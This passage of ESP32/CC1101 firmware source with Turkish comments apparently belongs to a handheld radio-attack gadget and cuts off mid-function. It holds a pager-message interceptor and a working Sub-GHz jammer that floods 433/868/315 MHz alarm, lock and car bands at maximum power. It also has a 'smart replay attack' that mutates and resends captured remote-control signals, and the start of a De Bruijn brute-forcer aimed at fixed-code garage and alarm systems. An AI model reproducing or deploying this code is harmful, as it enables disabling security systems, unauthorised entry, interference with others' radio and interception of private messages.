            if (bar > 0) display.fillRect(2, 34, bar, 8, SSD1306_WHITE);
            dispText(0, 46, String(g_cc1101Freq, 2) + "MHz");
            dispText(0, 56, "LONG=cik");
            dispCommit();
        }
        delay(30);
    }
    cc1101_strobe(CC1101_SIDLE);
    dispBannerOK("Mod: " + String(cc1101_modName(mods[ms])));
}

// ─── 6. Smart Meter Okuma ─────────────────────────────────
// Wireless M-Bus (EN 13757-4) gibi sayaç sinyallerini alır.
// Gerçek şifre çözme için cihaza özel anahtar gerekir;
// bu mod ham frame ve başlık alanlarını gösterir.
static void cc1101_smartmeter_run() {
    if (!cc1101_ensureInit()) return;

    // Wireless M-Bus T-Mode: 868.95 MHz, GFSK, 100kbps
    float smFreq = 868.95f;
    cc1101_setFrequency(smFreq);
    cc1101_setModulation(CC_MOD_GFSK);
    cc1101_setBaudRate(38400);  // T-mode yaklaşık 100kbps → 38400 yakın

    // M-Bus için sync word
    cc1101_writeReg(CC1101_SYNC1, 0x54);
    cc1101_writeReg(CC1101_SYNC0, 0x3D);
    cc1101_writeReg(CC1101_MDMCFG2, 0x06 | (uint8_t)CC_MOD_GFSK);  // sync 16 bit
    cc1101_writeReg(CC1101_PKTCTRL0, 0x02);  // infinite length
    cc1101_writeReg(CC1101_PKTCTRL1, 0x00);

    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SFRX);
    cc1101_strobe(CC1101_SRX);

    dispClear(); dispStatusBar("Smart Meter");
    dispText(0, 14, "M-Bus T-Mode");
    dispText(0, 24, String(smFreq, 2) + "MHz / GFSK");
    dispText(0, 34, "Sayac sinyali bekleniyor");
    dispText(0, 50, "LONG=cik");
    dispCommit();

    g_smReading.valid = false;
    uint32_t startT = millis();

    while (!readButtonLong()) {
        // RXBYTES kontrolü
        uint8_t rxBytes = cc1101_readStatus(CC1101_RXBYTES) & 0x7F;
        if (rxBytes >= 10) {
            uint8_t frame[64];
            uint8_t toRead = min((uint8_t)64, rxBytes);
            cc1101_readBurst(CC1101_RXFIFO | CC1101_READ_BURST, frame, toRead);
            cc1101_strobe(CC1101_SFRX);

            // M-Bus frame yorumlama (basit):
            // [L][C][M(2)][A(6)][Ver][Type][CI][Data...]
            if (toRead >= 8) {
                uint8_t  frameLen = frame[0];
                uint8_t  ctrlByte = frame[1];
                uint16_t mfCode   = ((uint16_t)frame[3] << 8) | frame[2];
                char mfStr[5];
                // M-Bus üretici kodu: 5 bit / char
                mfStr[0] = 64 + ((mfCode >> 10) & 0x1F);
                mfStr[1] = 64 + ((mfCode >>  5) & 0x1F);
                mfStr[2] = 64 + ( mfCode        & 0x1F);
                mfStr[3] = 0;
                uint32_t serNo = ((uint32_t)frame[7]<<24)|((uint32_t)frame[6]<<16)|
                                 ((uint32_t)frame[5]<<8)|frame[4];
                g_smReading.meterID = String(mfStr) + "-" + String(serNo, HEX);
                g_smReading.energy  = 0;
                // Basit enerji okuma: CI=0x78 veya 0x79 data block
                if (toRead >= 14 && (frame[9] == 0x04 || frame[9] == 0x06)) {
                    // 32-bit enerji değeri
                    uint32_t val = ((uint32_t)frame[13]<<24)|((uint32_t)frame[12]<<16)|
                                   ((uint32_t)frame[11]<<8)|frame[10];
                    g_smReading.energy = val * 0.001f;  // Wh → kWh
                }
                g_smReading.rssi  = (uint8_t)(-cc1101_getRSSI());
                g_smReading.valid = true;

                dispClear(); dispStatusBar("Smart Meter");
                dispText(0, 13, "ID: " + g_smReading.meterID.substring(0, 14));
                dispText(0, 25, "Enerji: " + String(g_smReading.energy, 3) + " kWh");
                dispText(0, 37, "RSSI: -" + String(g_smReading.rssi) + " dBm");
                dispText(0, 49, "Len: " + String(frameLen) + " C: " + String(ctrlByte, HEX));
                dispCommit();
                logPush("[SM] ID=" + g_smReading.meterID + " E=" + String(g_smReading.energy));
            }
        }

        int8_t r = cc1101_getRSSI();
        if (millis() - startT > 500 && !g_smReading.valid) {
            startT = millis();
            dispClear(); dispStatusBar("Smart Meter");
            dispText(0, 14, "868.95MHz GFSK");
            dispText(0, 26, "RSSI: " + String(r) + " dBm");
            dispText(0, 38, "Sayac bekle...");
            dispText(0, 52, "LONG=cik");
            dispCommit();
        }
        delay(50);
    }

    cc1101_strobe(CC1101_SIDLE);
    // Varsayılan ayarlara geri dön
    cc1101_setFrequency(g_cc1101Freq);
    cc1101_writeReg(CC1101_PKTCTRL0, 0x32);
    if (g_smReading.valid) { g_xpAnalCnt++; xpAdd(XP_PER_SMARTMETER); }
    dispBannerOK(g_smReading.valid ? "Okuma tamam!" : "Sinyal yok");
}

// ─── 7. Uzun Menzil (LoRa Benzeri) Modu ──────────────────
// CC1101 ile gerçek LoRa yapılamaz; bu mod çok dar bant
// GFSK + düşük baud + en yüksek güçle menzili maksimize eder
static void cc1101_longrange_run() {
    if (!cc1101_ensureInit()) return;

    dispClear(); dispStatusBar("Uzun Menzil");
    dispText(0, 14, "GFSK 1200bd dar bant");
    dispText(0, 26, "Maks cikis gucu");
    dispText(0, 38, "BTN=TX test  LONG=cik");
    dispCommit();

    // Uzun menzil konfigürasyonu
    cc1101_setModulation(CC_MOD_GFSK);
    cc1101_setBaudRate(1200);

    // Çok dar kanal filtresi (min bant genişliği)
    cc1101_writeReg(CC1101_MDMCFG4, 0xF5);  // CHANBW=58kHz
    cc1101_writeReg(CC1101_DEVIATN,  0x15);  // ±5.2kHz
    cc1101_writeReg(CC1101_AGCCTRL2, 0xC7);

    // Maks güç
    g_cc1101Power = 0xC3;  // +12dBm (CC1101 gerçek max)
    uint8_t paTable[8] = {0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    cc1101_writeBurst(CC1101_PATABLE, paTable, 8);

    // Sync kelimesi
    cc1101_writeReg(CC1101_SYNC1, 0xD3);
    cc1101_writeReg(CC1101_SYNC0, 0x91);
    cc1101_writeReg(CC1101_MDMCFG2, 0x16 | (uint8_t)CC_MOD_GFSK);  // 16-bit sync

    uint32_t txCount = 0;

    while (!readButtonLong()) {
        if (readButton()) {
            // Test paketi gönder
            cc1101_strobe(CC1101_SIDLE);
            cc1101_strobe(CC1101_SFTX);
            // TX FIFO'ya veri yükle
            uint8_t pkt[8] = {0xAA, 0x55, 0x4C, 0x52,  // preamble + "LR"
                               (uint8_t)(txCount>>8), (uint8_t)(txCount&0xFF),
                               0x00, 0xFF};
            cc1101_writeBurst(CC1101_TXFIFO | CC1101_WRITE_BURST, pkt, 8);
            cc1101_strobe(CC1101_STX);
            delay(80);  // 8 byte @ 1200baud ≈ 67ms
            cc1101_strobe(CC1101_SIDLE);
            txCount++;
            dispClear(); dispStatusBar("Uzun Menzil TX");
            dispText(0, 20, "Paket #" + String(txCount) + " gonderildi");
            dispText(0, 32, String(g_cc1101Freq, 2) + "MHz");
            dispText(0, 44, "GFSK 1200bd +10dBm");
            dispCommit();
            logPush("[LR] TX pkt #" + String(txCount));
            delay(500);
            continue;
        }

        // RX dinle
        cc1101_strobe(CC1101_SIDLE);
        cc1101_strobe(CC1101_SRX);
        uint32_t rxT = millis();
        bool got = false;
        while (millis() - rxT < 800) {
            uint8_t rxb = cc1101_readStatus(CC1101_RXBYTES) & 0x7F;
            if (rxb >= 8) {
                uint8_t buf[8];
                cc1101_readBurst(CC1101_RXFIFO | CC1101_READ_BURST, buf, 8);
                cc1101_strobe(CC1101_SFRX);
                int8_t r = cc1101_getRSSI();
                dispClear(); dispStatusBar("LR RX");
                dispText(0, 14, "Paket alindi!");
                dispText(0, 26, "RSSI: " + String(r) + " dBm");
                dispText(0, 38, "Seq: " + String(((uint16_t)buf[4]<<8)|buf[5]));
                dispCommit();
                logPush("[LR] RX rssi=" + String(r));
                got = true; break;
            }
            delay(10);
        }

        if (!got) {
            int8_t r = cc1101_getRSSI();
            dispClear(); dispStatusBar("LR Dinleme");
            dispText(0, 14, "RSSI: " + String(r) + " dBm");
            dispText(0, 26, "TX sayac: " + String(txCount));
            dispText(0, 38, "BTN=TX  LONG=cik");
            dispCommit();
        }
        delay(100);
    }

    cc1101_strobe(CC1101_SIDLE);
    // Varsayılan ayarlara geri dön
    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_setBaudRate(4800);
    cc1101_writeReg(CC1101_PKTCTRL0, 0x32);
    dispBannerOK("LR mod bitti TX=" + String(txCount));
}

// ─── 8. POCSAG / Pager Çözücü ────────────────────────────
// POCSAG: 512, 1200, 2400 baud, FSK ±4.5kHz, genellikle 152-170 MHz aralığı
// veya bazı bölgelerde 450-470 MHz
static void cc1101_pocsag_run() {
    if (!cc1101_ensureInit()) return;

    // Frekans seçimi — ülkeye göre farklı
    OptionList freqOpts = {
        {"152.025 MHz (TR PTT)", [](){}},
        {"153.000 MHz",          [](){}},
        {"466.075 MHz",          [](){}},
        {"466.175 MHz",          [](){}},
        {"138.000 MHz",          [](){}},
        {"Back",                 [](){}},
    };
    int fs = loopOptions(freqOpts, "POCSAG Freq");
    if (fs < 0 || fs == 5) return;
    float pFreqs[] = {152.025f, 153.0f, 466.075f, 466.175f, 138.0f};
    cc1101_setFrequency(pFreqs[fs]);

    // POCSAG: FSK 2kHz, 1200baud (en yaygın)
    cc1101_setModulation(CC_MOD_2FSK);
    cc1101_setBaudRate(1200);
    cc1101_writeReg(CC1101_DEVIATN,  0x24);  // ±9.5kHz (POCSAG ±4.5kHz, biraz geniş tut)
    cc1101_writeReg(CC1101_MDMCFG4, 0x87);  // BW=100kHz
    cc1101_writeReg(CC1101_MDMCFG2, 0x02 | (uint8_t)CC_MOD_2FSK);  // no sync, raw mode
    cc1101_writeReg(CC1101_PKTCTRL0, 0x32);  // infinite length
    cc1101_writeReg(CC1101_AGCCTRL2, 0x43);
    cc1101_writeReg(CC1101_IOCFG0,  0x0C);  // GDO0: serial data sync

    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SFRX);
    cc1101_strobe(CC1101_SRX);

    g_pocsagMsgs.clear();

    dispClear(); dispStatusBar("POCSAG Pager");
    dispText(0, 13, String(pFreqs[fs], 3) + "MHz / 1200bd");
    dispText(0, 25, "FSK dinleniyor...");
    dispText(0, 37, "Mesajlar asagida");
    dispText(0, 55, "LONG=cik");
    dispCommit();

    // POCSAG bit buffer
    static constexpr uint16_t POCSAG_BUF = 512;
    uint8_t  bitBuf[POCSAG_BUF / 8];
    uint16_t bitPos = 0;
    memset(bitBuf, 0, sizeof(bitBuf));

    // POCSAG sync word: 0x7CD215D8
    static constexpr uint32_t POCSAG_SYNC = 0x7CD215D8UL;
    static constexpr uint32_t POCSAG_IDLE = 0x7A89C197UL;

    uint32_t shiftReg = 0;
    bool     synced   = false;
    uint8_t  wordBits = 0;
    uint32_t curWord  = 0;
    uint8_t  batchPos = 0;  // 0..7 words per batch (8 codewords / frame)
    uint8_t  frameNo  = 0;

    // Metin decode için basit BCD/ASCII decode
    auto pocsagDecode = [&](uint32_t cw, bool& isAddr, uint32_t& capcode, char* txt) -> bool {
        uint32_t d = cw >> 1;  // bit 31 = funcbits/type
        if (cw & 0x80000000UL) {
            // Message word
            isAddr = false;
            uint8_t bits[20];
            for (int i=0; i<20; i++) bits[i] = (d >> (19-i)) & 1;
            // 7-bit ASCII characters
            for (int c=0; c<2; c++) {
                uint8_t ch = 0;
                for (int b=0; b<7; b++) ch |= bits[c*7+b] << b;
                if (ch >= 32 && ch < 127) txt[c] = (char)ch;
                else txt[c] = '.';
            }
            txt[2] = 0;
            return true;
        } else {
            // Address word
            isAddr   = true;
            capcode  = ((d >> 13) << 3);  // 18 upper bits × 8 + frame offset
            txt[0] = 0;
            return true;
        }
    };

    uint32_t lastUpdate = millis();

    while (!readButtonLong()) {
        // RX FIFO'dan byte oku
        uint8_t rxb = cc1101_readStatus(CC1101_RXBYTES) & 0x7F;
        if (rxb > 0) {
            uint8_t b = cc1101_readStatus(CC1101_RXFIFO | CC1101_READ_BURST);
            // Her biti shift register'a ekle
            for (int bit = 7; bit >= 0; bit--) {
                shiftReg = (shiftReg << 1) | ((b >> bit) & 1);
                if (!synced) {
                    if (shiftReg == POCSAG_SYNC) {
                        synced   = true;
                        wordBits = 0;
                        curWord  = 0;
                        batchPos = 0;
                        frameNo  = 0;
                    }
                } else {
                    curWord = (curWord << 1) | ((b >> bit) & 1);
                    wordBits++;
                    if (wordBits == 32) {
                        bool   isAddr = false;
                        uint32_t cc  = 0;
                        char    txt[4] = "";
                        if (curWord == POCSAG_SYNC) {
                            batchPos = 0; frameNo++;
                        } else if (curWord == POCSAG_IDLE) {
                            // idle
                        } else if (pocsagDecode(curWord, isAddr, cc, txt)) {
                            if (isAddr && cc != 0) {
                                POCSAGMsg msg; msg.capcode = cc;
                                msg.message = ""; msg.funcBits = (curWord >> 1) & 0x03;
                                g_pocsagMsgs.push_back(msg);
                                logPush("[POCSAG] CAP=" + String(cc) + " fn=" + String(msg.funcBits));
                                g_xpAnalCnt++;
                                xpAdd(XP_PER_POCSAG);
                            } else if (!isAddr && !g_pocsagMsgs.empty()) {
                                g_pocsagMsgs.back().message += String(txt);
                            }
                        }
                        wordBits = 0; curWord = 0;
                        batchPos = (batchPos + 1) % 8;
                    }
                }
            }
        }

        if (millis() - lastUpdate > 600) {
            lastUpdate = millis();
            dispClear(); dispStatusBar("POCSAG");
            dispText(0, 12, String(pFreqs[fs], 2) + "MHz " + (synced ? "SYNC" : "hunt"));
            dispText(0, 22, "RSSI: " + String(cc1101_getRSSI()) + "dBm");
            dispText(0, 32, "Mesaj: " + String(g_pocsagMsgs.size()));
            if (!g_pocsagMsgs.empty()) {
                auto& last = g_pocsagMsgs.back();
                dispText(0, 42, "CAP:" + String(last.capcode));
                String msg = last.message.substring(0, 20);
                dispText(0, 52, msg);
            } else {
                dispText(0, 42, "Sinyal bekleniyor...");
                dispText(0, 54, "LONG=cik");
            }
            dispCommit();
        }
        delay(5);
    }

    cc1101_strobe(CC1101_SIDLE);
    cc1101_setFrequency(g_cc1101Freq);
    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_writeReg(CC1101_PKTCTRL0, 0x32);
    cc1101_writeReg(CC1101_IOCFG0,   0x0D);

    // Yakalanan mesajları göster
    if (g_pocsagMsgs.empty()) {
        dispBannerWarn("Mesaj bulunamadi");
        return;
    }
    while (!g_returnToMenu) {
        OptionList msgOpts;
        for (size_t i = 0; i < g_pocsagMsgs.size() && i < 10; i++) {
            String lbl = "CAP:" + String(g_pocsagMsgs[i].capcode) +
                         " " + g_pocsagMsgs[i].message.substring(0,8);
            msgOpts.push_back({lbl, [](){}});
        }
        msgOpts.push_back({"Back", []() { backToMenu(); }});
        int sel = loopOptions(msgOpts, "POCSAG Msgs");
        if (sel < 0 || sel == (int)msgOpts.size()-1) { backToMenu(); break; }
        // Seçilen mesajın detayını göster
        dispClear(); dispStatusBar("Pager Msg");
        dispText(0, 12, "CAP: " + String(g_pocsagMsgs[sel].capcode));
        dispText(0, 24, "Fn:  " + String(g_pocsagMsgs[sel].funcBits));
        String fullMsg = g_pocsagMsgs[sel].message;
        dispText(0, 36, fullMsg.substring(0, 20));
        if (fullMsg.length() > 20) dispText(0, 48, fullMsg.substring(20, 40));
        dispCommit();
        delay(4000);
    }
}

// ─── 9. CC1101 Frekans Ayarı ──────────────────────────────
static void cc1101_freq_run() {
    if (!cc1101_ensureInit()) return;

    OptionList freqOpts = {
        {"433.92 MHz (EU ISM)",  []() { cc1101_setFrequency(433.92f); }},
        {"434.15 MHz",           []() { cc1101_setFrequency(434.15f); }},
        {"315.00 MHz (US)",      []() { cc1101_setFrequency(315.00f); }},
        {"868.30 MHz (EU)",      []() { cc1101_setFrequency(868.30f); }},
        {"868.95 MHz (M-Bus)",   []() { cc1101_setFrequency(868.95f); }},
        {"915.00 MHz (US ISM)",  []() { cc1101_setFrequency(915.00f); }},
        {"152.025 MHz (Pager)",  []() { cc1101_setFrequency(152.025f); }},
        {"Back",                 []() {}},
    };
    int sel = loopOptions(freqOpts, "Frekans Sec");
    if (sel < 0 || sel == (int)freqOpts.size()-1) return;
    freqOpts[sel].action();
    dispBannerOK("Frek: " + String(g_cc1101Freq, 3) + " MHz");
    logPush("[CC1101] Freq=" + String(g_cc1101Freq, 3) + "MHz");
}

// ─── 10. CC1101 Durum / Test ──────────────────────────────
static void cc1101_info_run() {
    if (!cc1101_ensureInit()) return;

    uint8_t ver  = cc1101_readStatus(CC1101_VERSION);
    uint8_t part = cc1101_readStatus(CC1101_PARTNUM);
    uint8_t marc = cc1101_readStatus(CC1101_MARCSTATE) & 0x1F;
    int8_t  rssi = cc1101_getRSSI();

    const char* marcNames[] = {
        "SLEEP","IDLE","XOFF","VCO_CAL","RX","FSTXON","TX","TXEND",
        "RXOVF","TXUNDF","FS_LOCK","RX_CAL","TX_CAL","RX2RX","IFAD","?",
        "?","?","?","?","?","?","?","?","?","?","?","?","?","?","?","?"
    };

    dispClear(); dispStatusBar("CC1101 Info");
    dispText(0, 12, "Part: 0x" + String(part, HEX) + "  Ver: 0x" + String(ver, HEX));
    dispText(0, 22, "State: " + String(marcNames[marc < 32 ? marc : 15]));
    dispText(0, 32, "Freq: " + String(g_cc1101Freq, 2) + " MHz");
    dispText(0, 42, "Mod: " + String(cc1101_modName(g_cc1101Mod)));
    dispText(0, 52, "RSSI: " + String(rssi) + " dBm");
    dispCommit();
    delay(4000);
}

// ─── 11. Sub-GHz Jammer ───────────────────────────────────
// Seçili frekansta sürekli rastgele OOK gürültüsü yayarak
// o bantı dinleyen alıcıları etkisiz hale getirir.
// 433 MHz alarm/kumanda, 868 MHz kilit/kapı, 315 MHz US sistemleri.
static void cc1101_jammer_run() {
    if (!cc1101_ensureInit()) return;

    OptionList freqOpts = {
        {"433.92 MHz (EU araç/alarm)", [](){}},
        {"868.30 MHz (EU kilit/kapi)", [](){}},
        {"315.00 MHz (US araç)",       [](){}},
        {"434.42 MHz (EU alt band)",   [](){}},
        {"868.95 MHz (M-Bus)",         [](){}},
        {"Tum Bantlar (Hop)",          [](){}},
        {"Back",                       [](){}},
    };
    int fs = loopOptions(freqOpts, "Jammer: Frek");
    if (fs < 0 || fs == 6) return;

    float jamFreqs[]   = {433.92f, 868.30f, 315.00f, 434.42f, 868.95f};
    bool  multiHop     = (fs == 5);
    uint8_t hopIdx     = 0;

    // CC1101'i maksimum güç OOK TX moduna al
    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_writeReg(CC1101_PKTCTRL0, 0x32); // sonsuz paket
    cc1101_writeReg(CC1101_IOCFG0,   0x2E); // GDO0 tri-state

    // PATABLE: her iki slot da max güç (OOK "1" = TX on)
    uint8_t paMax[8] = {g_cc1101Power, g_cc1101Power,
                        g_cc1101Power, g_cc1101Power,
                        g_cc1101Power, g_cc1101Power,
                        g_cc1101Power, g_cc1101Power};
    cc1101_writeBurst(CC1101_PATABLE, paMax, 8);

    if (!multiHop) cc1101_setFrequency(jamFreqs[fs]);

    dispClear(); dispStatusBar("JAMMER AKTIF");
    dispText(0, 14, multiHop ? "Tum Bantlar" : String(jamFreqs[fs], 2) + " MHz");
    dispText(0, 26, "Guc: MAX (+12 dBm)");
    dispText(0, 38, "Mod: OOK Gurultu");
    dispText(0, 52, "[LONG] durdur");
    dispCommit();

    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_STX);

    uint32_t pktCount  = 0;
    uint32_t lastDraw  = 0;
    uint32_t lastHop   = 0;

    while (!readButtonLong()) {
        // Rastgele 64 byte gürültü TX FIFO'ya yaz
        uint8_t noiseBuf[64];
        for (uint8_t i = 0; i < 64; i++) noiseBuf[i] = (uint8_t)esp_random();
        cc1101_writeBurst(CC1101_TXFIFO, noiseBuf, 64);

        // TX durumunu kontrol et, gerekirse yeniden başlat
        uint8_t marc = cc1101_readStatus(CC1101_MARCSTATE) & 0x1F;
        if (marc == 0x16) { // TXFIFO underflow
            cc1101_strobe(CC1101_SFTX);
            cc1101_strobe(CC1101_STX);
        }
        pktCount++;

        // Çoklu hop modu: her 80ms'de frekans değiştir
        if (multiHop && millis() - lastHop > 80) {
            lastHop = millis();
            hopIdx  = (hopIdx + 1) % 5;
            cc1101_strobe(CC1101_SIDLE);
            cc1101_setFrequency(jamFreqs[hopIdx]);
            cc1101_strobe(CC1101_STX);
        }

        if (millis() - lastDraw > 300) {
            lastDraw = millis();
            dispClear(); dispStatusBar("!!! JAMMER !!!");
            if (multiHop)
                dispText(0, 12, String(jamFreqs[hopIdx], 2) + " MHz [HOP]");
            else
                dispText(0, 12, String(jamFreqs[fs], 2) + " MHz");
            dispText(0, 24, "Paket: " + String(pktCount));
            // Animasyonlu yayın göstergesi
            static uint8_t anim = 0; anim = (anim + 1) % 4;
            const char* ani[] = {"<<<", "<<< ", " <<<", "  <<<"};
            dispText(0, 36, String(ani[anim]) + " TX AKTIF " + String(ani[(anim+2)%4]));
            dispText(0, 52, "[LONG] durdur");
            dispCommit();
        }
        delayMicroseconds(500);
    }

    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SFTX);
    // PATABLE'ı normal hale getir
    uint8_t paTable[8] = {0x00, g_cc1101Power, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    cc1101_writeBurst(CC1101_PATABLE, paTable, 8);
    cc1101_writeReg(CC1101_IOCFG0, 0x0D);
    logPush("[JAMMER] stopped pkts=" + String(pktCount)
            + " freq=" + String(multiHop ? jamFreqs[hopIdx] : jamFreqs[fs], 2) + "MHz");
    dispBannerOK("Jammer durduruldu: " + String(pktCount) + " pkt");
}

// ─── 12. Akıllı Replay Attack ─────────────────────────────
// Yakalanan sinyali çeşitli manipülasyonlarla (timing,
// bit-flip, fragment) tekrar göndererek sistemin hangi
// bitlere / zamanlamaya duyarlı olduğunu test eder.
static void cc1101_smart_replay_run() {
    if (!cc1101_ensureInit()) return;

    if (!spiffs_ensure()) { dispBannerErr("SPIFFS hatasi!"); return; }
    std::vector<String> files = rf_capture_list();
    if (files.empty()) { dispBannerWarn("Kayitli sinyal yok!"); return; }

    OptionList fileOpts;
    for (auto& f : files) {
        String sn = f;
        if (sn.startsWith("spiffs:")) sn = "[S]" + sn.substring(sn.lastIndexOf('/') + 1);
        else if (sn.startsWith("sd:"))    sn = "[D]" + sn.substring(sn.lastIndexOf('/') + 1);
        if (sn.endsWith(".bin"))  sn = sn.substring(0, sn.length() - 4);
        if (sn.length() > 17)    sn = sn.substring(0, 16) + "~";
        fileOpts.push_back({sn, [](){}});
    }
    fileOpts.push_back({"Back", [](){}});
    int fsel = loopOptions(fileOpts, "Akilli Replay: Dosya");
    if (fsel < 0 || fsel == (int)fileOpts.size() - 1) return;

    dispProgress("Akilli Replay", "Yukleniyor...", 30);
    if (!rf_capture_load(files[fsel])) { dispBannerErr("Yuklenemedi!"); return; }
    if (g_rfCaptureLen < 4) { dispBannerWarn("Cok kisa!"); return; }

    // Saldırı modu seç
    OptionList modeOpts = {
        {"1) Timing -50%  (yavas)",  [](){}},
        {"2) Timing +50%  (hizli)",  [](){}},
        {"3) Bit Flip (rastgele)",   [](){}},
        {"4) Bit Flip (sistematik)", [](){}},
        {"5) Fragment (yarisi)",     [](){}},
        {"6) Fragment (ceyrek)",     [](){}},
        {"7) Hepsi Sirali",         [](){}},
        {"Back",                    [](){}},
    };
    int msel = loopOptions(modeOpts, "Saldiri Modu");
    if (msel < 0 || msel == 7) return;

    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_setFrequency(g_cc1101Freq);

    // Orijinal pulse'ları yedekle
    static RFPulse origPulses[CC_CAPTURE_MAX];
    uint16_t origLen = g_rfCaptureLen;
    memcpy(origPulses, g_rfCapture, origLen * sizeof(RFPulse));

    uint32_t totalSent = 0;
    bool aborted = false;

    // Yardımcı: mevcut capture'ı N kez gönder
    auto sendCurrent = [&](const char* label, uint16_t reps) {
        for (uint16_t r = 0; r < reps; r++) {
            cc1101_sendPulses(g_rfCapture, g_rfCaptureLen);
            delay(30);
        }
        logPush(String("[SMART_REPLAY] mode=") + label
                + " reps=" + String(reps)
                + " pulses=" + String(g_rfCaptureLen));
    };

    // Yardımcı: tek bir modu çalıştır, aborted flag'ını döndürür
    // NOT: lambda özyinelemeli olamayacağından case 6 bu fonksiyonu doğrudan çağırır
    // Bu yüzden her mod ayrı bir blok olarak düzenlendi.
    auto runSingleMode = [&](int mode) {
        // Her modda önce orijinali geri yükle
        memcpy(g_rfCapture, origPulses, origLen * sizeof(RFPulse));
        g_rfCaptureLen = origLen;
        dispClear(); dispStatusBar("Akilli Replay");

        switch (mode) {
        case 0: // Timing -%50 (daha yavaş)
            dispText(0, 20, "Timing: -50% (yavas)");
            dispCommit(); delay(600);
            for (uint16_t i = 0; i < g_rfCaptureLen; i++)
                g_rfCapture[i].dur = (g_rfCapture[i].dur * 3) / 2;
            sendCurrent("slow", 5);
            totalSent += 5;
            break;

        case 1: // Timing +%50 (daha hızlı)
            dispText(0, 20, "Timing: +50% (hizli)");
            dispCommit(); delay(600);
            for (uint16_t i = 0; i < g_rfCaptureLen; i++)
                g_rfCapture[i].dur = max((uint16_t)50, (uint16_t)(g_rfCapture[i].dur * 2 / 3));
            sendCurrent("fast", 5);
            totalSent += 5;
            break;

        case 2: { // Bit flip - rastgele
            dispText(0, 20, "Bit Flip: Rastgele");
            dispCommit(); delay(600);
            uint8_t flipIdx = (uint8_t)(esp_random() % g_rfCaptureLen);
            g_rfCapture[flipIdx].level = !g_rfCapture[flipIdx].level;
            sendCurrent("bitflip_rnd", 3);
            totalSent += 3;
            break;
        }

        case 3: // Bit flip - sistematik (her biti sırayla dene)
            dispText(0, 20, "Bit Flip: Sistematik");
            dispCommit(); delay(400);
            for (uint16_t bi = 0; bi < min(origLen, (uint16_t)32); bi++) {
                if (readButtonLong()) { aborted = true; break; }
                memcpy(g_rfCapture, origPulses, origLen * sizeof(RFPulse));
                g_rfCaptureLen = origLen;
                g_rfCapture[bi].level = !g_rfCapture[bi].level;
                cc1101_sendPulses(g_rfCapture, g_rfCaptureLen);
                totalSent++;
                delay(25);
                if (bi % 4 == 0) {
                    dispClear(); dispStatusBar("Bit Flip Sys");
                    dispText(0, 20, "Bit: " + String(bi) + "/" + String(origLen));
                    dispText(0, 30, "Toplam: " + String(totalSent));
                    dispCommit();
                }
            }
            break;

        case 4: // Fragment - ilk yarı
            dispText(0, 20, "Fragment: Ilk %50");
            dispCommit(); delay(600);
            g_rfCaptureLen = origLen / 2;
            sendCurrent("frag_half", 5);
            totalSent += 5;
            break;

        case 5: // Fragment - ilk çeyrek
            dispText(0, 20, "Fragment: Ilk %25");
            dispCommit(); delay(600);
            g_rfCaptureLen = origLen / 4;
            if (g_rfCaptureLen < 2) g_rfCaptureLen = 2;
            sendCurrent("frag_qtr", 5);
            totalSent += 5;
            break;

        default:
            break;
        }
    };

    dispClear(); dispStatusBar("Akilli Replay");
    dispText(0, 14, "Basliyor...");
    dispText(0, 26, "Frek: " + String(g_cc1101Freq, 2) + " MHz");
    dispText(0, 38, "Pulse: " + String(origLen));
    dispCommit();
    delay(500);

    if (msel == 6) {
        // Hepsi sıralı: 0..5 modlarını arka arkaya çalıştır
        for (int m2 = 0; m2 < 6 && !aborted; m2++) {
            if (readButtonLong()) { aborted = true; break; }
            runSingleMode(m2);
            delay(200);
        }
    } else {
        runSingleMode(msel);
    }

    // Orijinali geri yükle
    memcpy(g_rfCapture, origPulses, origLen * sizeof(RFPulse));
    g_rfCaptureLen = origLen;
    cc1101_strobe(CC1101_SIDLE);
    buzzRFReplay();
    if (aborted)
        dispBannerWarn("Durduruldu: " + String(totalSent) + " gonderim");
    else
        dispBannerOK("Akilli Replay bitti: " + String(totalSent) + " gonderim");
}

// ─── 13. De Bruijn Sequence Brute Force ───────────────────
// De Bruijn dizisi: N-bit tüm kombinasyonları en kısa bit
// dizisinde içeren matematiksel yapıdır.
// Normal BF = 2^N paket gönderir.
// De Bruijn BF = 2^N + (N-1) bit uzunluğunda TEK paket →
// alıcı paket sınırlarını bulmakta zorlanır, çok daha hızlı.
// Özellikle sabit kodlu garaj/alarm sistemlerine karşı etkili.
static void cc1101_debruijn_run() {
    if (!cc1101_ensureInit()) return;

    OptionList freqOpts = {
        {"433.92 MHz",               [](){}},
        {"315.00 MHz",               [](){}},
        {"868.30 MHz",               [](){}},
        {"390.00 MHz (Genie)",       [](){}},
        {"300.00 MHz (Linear)",      [](){}},
        {"Back",                     [](){}},
    };
    int fs = loopOptions(freqOpts, "De Bruijn: Frek");
    if (fs < 0 || fs == 5) return;
    float dbFreqs[] = {433.92f, 315.0f, 868.30f, 390.0f, 300.0f};
    cc1101_setFrequency(dbFreqs[fs]);
    cc1101_setModulation(CC_MOD_ASKOOK);

    OptionList bitOpts = {
        {"8-bit  (256 kombinasyon)",   [](){}},
        {"10-bit (1024 kombinasyon)",  [](){}},
        {"12-bit (4096 kombinasyon)",  [](){}},
        {"Back",                       [](){}},
    };
    int bs = loopOptions(bitOpts, "De Bruijn: N-bit");
    if (bs < 0 || bs == 3) return;
    uint8_t N = (bs == 0) ? 8 : (bs == 1) ? 10 : 12;

    // De Bruijn dizisi üret (Martin algoritması, B(2,N))
    // Dizi uzunluğu = 2^N bit
    uint32_t seqLen  = (uint32_t)1 << N;
    uint32_t bufBytes = (seqLen + 7) / 8 + 4; // byte cinsinden + guard

    // Dinamik bellek — N≤12 için max 512 byte
    static uint8_t dbSeq[512]; // 4096 bit / 8 = 512 byte
    memset(dbSeq, 0, sizeof(dbSeq));

    // Martin's De Bruijn algoritması (LFSR tabanlı)
    // Seed = 0, polynomial shift
    {
        uint16_t lfsr = 1;
        for (uint32_t i = 0; i < seqLen; i++) {
            uint8_t bit = lfsr & 1;
            // Byte ve bit pozisyonu
            dbSeq[i / 8] |= (bit << (7 - (i % 8)));
